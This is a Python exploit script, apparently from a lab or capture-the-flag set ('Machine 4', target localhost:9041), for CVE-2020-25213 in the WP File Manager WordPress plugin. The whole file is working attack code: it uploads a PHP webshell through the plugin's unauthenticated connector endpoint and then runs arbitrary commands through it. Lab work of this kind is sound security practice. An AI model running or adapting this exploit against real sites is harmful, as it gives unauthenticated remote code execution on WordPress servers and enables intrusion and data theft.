#!/usr/bin/env python3
"""
Machine 4 - WordPress WP File Manager CVE-2020-25213 RCE
Target: http://localhost:9041
Vulnerability: Unauthenticated file upload leading to RCE
"""

import requests
import sys
import random
import string

TARGET = "http://localhost:9041"

def generate_filename():
    """Generate random PHP filename"""
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + ".php"

def exploit(cmd):
    """Exploit WP File Manager to upload and execute PHP code"""
    filename = generate_filename()
    
    # PHP webshell content
    php_code = f'<?php echo shell_exec($_GET["cmd"]); ?>'
    
    # CVE-2020-25213 upload endpoint
    upload_url = f"{TARGET}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
    
    files = {
        'upload[]': (filename, php_code, 'application/x-php'),
        'cmd': (None, 'upload'),
        'target': (None, 'l1_Lw'),  # Root directory
    }
    
    try:
        # Attempt upload
        response = requests.post(upload_url, files=files, timeout=10)
        
        if response.status_code == 200 and 'added' in response.text:
            print(f"[+] Uploaded: {filename}")
            
            # Execute command via uploaded shell
            shell_url = f"{TARGET}/wp-content/plugins/wp-file-manager/lib/files/{filename}"
            exec_response = requests.get(shell_url, params={"cmd": cmd}, timeout=10)
            return exec_response.text
        else:
            return f"Upload failed: {response.text[:200]}"
            
    except requests.RequestException as e:
        return f"Error: {e}"

def main():
    print("[*] Machine 4 - WP File Manager CVE-2020-25213 RCE")
    print(f"[*] Target: {TARGET}")
    print("-" * 50)
    
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
    else:
        cmd = "id"
    
    print(f"[+] Executing command: {cmd}")
    print("-" * 50)
    
    result = exploit(cmd)
    print(result)

if __name__ == "__main__":
    main()
